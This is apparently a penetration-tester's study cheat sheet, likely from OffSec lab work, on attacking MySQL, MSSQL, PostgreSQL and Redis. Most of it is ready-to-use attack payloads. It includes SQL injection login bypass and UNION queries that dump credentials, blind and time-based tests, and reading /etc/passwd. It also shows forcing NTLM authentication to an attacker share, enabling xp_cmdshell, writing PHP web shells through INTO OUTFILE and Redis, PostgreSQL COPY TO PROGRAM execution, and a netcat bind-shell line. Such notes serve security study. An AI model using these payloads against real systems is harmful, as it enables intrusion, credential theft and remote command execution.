---
title: SQL Injection
---
# MySql
- Check if we can log in to a DB instance
```zsh
mysql -u root -p'root' -h 192.168.50.16 -P 3306
```
## Queries
- Version: `select version();` or `select @@version` - both are supported
- DB System User: `select system_user();`
- Databases: `show databases;`
## Comments
- Common ways to comment in MySQL `--`, `#` and `/* */`
```sql
SELECT 1+1;     # This comment continues to the end of line

SELECT 1+1;     -- This comment continues to the end of line

SELECT 1 /* this is an in-line comment */ + 1;

SELECT 1+
/*
this is a
multiple-line comment
*/
1;
```
- For more check [PayloadAllTheThings - MySQL Comments](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-comments)
# MSSQL
- Use `impacket-mssqlclient` to interact
```zsh
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth 
```
- We can supply `--port` in case MSSQL is not running on default 1433
- The username can also be in form `domain/user:password@ip` in case of domain authentication

## Queries
- Version: `SELECT @@version;`
- Databases: `SELECT name FROM sys.databases;`
- Tables: `SELECT * FROM {DBNAME}.information_schema.tables;`
- To then query records within those tables, we need to use the following structure: `SELECT * FROM {DBNAME}.{TABLE_SCHEMA}.{TABLE_NAME};` (e.g `select * from offsec.dbo.users;`)
- We might be able to capture NTLM hashes with MSSQL which could then be used in conjunction with NTLM passing or relaying as described in [[Password Attacks]]

```sql
#Enumerate if our current user has the right permissions
Use master;
EXEC sp_helprotect 'xp_dirtree';
EXEC sp_helprotect 'xp_subdirs';
EXEC sp_helprotect 'xp_fileexist';

#Trigger an authentication to our share with one of the commands
EXEC xp_dirtree '\\192.168.45.178\alexa'
```
## Comments
- The common ways to to comment in MSSQL are `--` and `/* */`
- For more check [PayloadAllTheThings - MSSQL Comments](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md#mssql-comments)

# Manual Injection
- Identify by trying to trigger an error while escaping the query
- Try to understand how the original query was shaped (e.g `SELECT` or `INSER` statement)
- Try to then craft a valid statement
```sql
admin' OR 1=1 -- //

' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
```
- Adding two slashes at the end of the comment provides visibility on our payload and also adds some protection against any kind of whitespace truncation the web application might employ.
### UNION Based SQLi
- For UNION Based SQLi to work, two conditions need to be fulfilled
	1. The injected UNION query has to include the same number of columns as the original query.
	2. The data types need to be compatible between each column.
- We can enumerate the number of columns used in the original statement by using `' ORDER BY 1-- //` . Increase the column-number to order by until we reach an error. 
- If we know the number of columns, we can add our `UNION SELECT` statement
```sql
' UNION SELECT database(), user(), @@version, null, null -- //
```
- Using the first column for strings often fails as the first column in the original statement is the ID filed which is an integer. Condition number 2: The data types need to be compatible between each column.
- Once we have a working query going, we can keep enumerating for other Tables.
```sql
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
```
- If we do not have enough columns to output our results or only certain columns have visual output, we can group with `group_concat(username,':',password,':',name)`
```sql
`username='union select 1,group_concat(username,':',password,':',name),3,4,5 from users-- -&password=idontknow`
```
- We might also be able to read files 
```sql 
UNION ALL SELECT LOAD_FILE('/etc/passwd') -- //
UNION ALL SELECT TO_base64(LOAD_FILE('/var/www/html/index.php'));
```
## Blind SQL Injections
- Try to see how the web application behaves based on the nature of the statement
```zsh
http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //
```
- The above will only return true if the user offsec is present. Otherwise false
- If we do not get an error message, we can try using time as an indicator
```zsh
http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
```
## Manual Code Execution
- Depending on the configuration and the database system we might be able to execute code directly
### MSSQL
- In MSSQL the `xp_cmdshell` function can be used.
```sql
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXECUTE xp_cmdshell 'whoami';
```
- We can run `EXECUTE sp_configure;` to list the current configuration
- Another option is to write output to a file on the system which we could then call
### MySQL
- In MySQL the `SELECT INTO_OUTFILE` ca be abused
```sql
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```

### PostgreSQL 
- Basic information and enumeration (and more ofc) can be found on [Hacktricks - Pentesting Postgresql](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-postgresql.html)
- Installations running Postgres 9.3 and above have functionality which allows for the superuser and users with '`pg_execute_server_program`' to pipe to and from an external program using `COPY`.
- To list the roles of our current user we can use the `\du` command.
```sql
COPY (SELECT '') to PROGRAM 'ping -c 4 192.168.45.231';

CREATE TABLE alexa(output text);
COPY alexa FROM PROGRAM 'ping -c 4 192.168.45.231';
```
- We can read files with `pg_read_binary_file` or `pg_read_file`
```sql
select * from pg_read_binary_file('/etc/passwd');
select * from pg_read_file('/etc/passwd', 0, 1000000);
```
- We can also try to write a file using `COPY`
```sql
COPY (SELECT 'nc -lvvp 2346 -e /bin/bash') TO '/tmp/pentestlab';
```
- To list directories we can use `pg_ls_dir`
```sql
select * from pg_ls_dir('/tmp');
```
# Redis
- Not an SQL Injection but if we find redis in Version 4.x/5.x we may be able to execute code or write files
- Detailed infos on [Hacktricks - Pentesting Redis](https://book.hacktricks.wiki/en/network-services-pentesting/6379-pentesting-redis.html)
- Default location for redis configuration file is `/etc/redis/redis.conf`, the service file can be found in `/etc/systemd/system/redis.service`
- Writing a file can be achieved as follows, make sure that the directory is writeable
```zsh
AUTH mysuperpassword #In case authentication is needs, credentials can be found in /etc/passwd
config set dir /var/www/html
config set dbfilename redis.php
set test "<?php system($_GET['cmd']);?>"
save
```
- We might also be able to load a malicious module ([n0b0dyCN on Github](https://github.com/n0b0dyCN/RedisModules-ExecuteCommand)) to redis which allows us to execute code. This module will need to be transferred to the host first
```zsh
MODULE LOAD /path/to/mymodule.so
system.exec "id"
```